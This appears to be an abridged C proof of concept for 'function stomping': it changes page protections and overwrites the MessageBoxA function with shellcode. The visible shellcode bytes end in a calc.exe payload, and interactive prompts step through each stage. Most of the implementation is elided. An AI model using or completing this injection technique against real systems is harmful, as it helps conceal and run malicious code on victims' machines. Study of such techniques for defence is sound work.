...
BOOL stomper(FARPROC Paddress, char* shellcode, SIZE_T szshellcode) {
	...
	printf("protection changed to ReadWrite\n");
	...
	printf("press enter to set the protection to it's original form: ");
	getchar();
	...
	printf("Permission set to it's original form\n");
...
,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
	...
	printf("press Enter to change Page permission: ");
	getchar();
	...
	printf("press enter to call stomped MessageboxA: ");
	getchar();
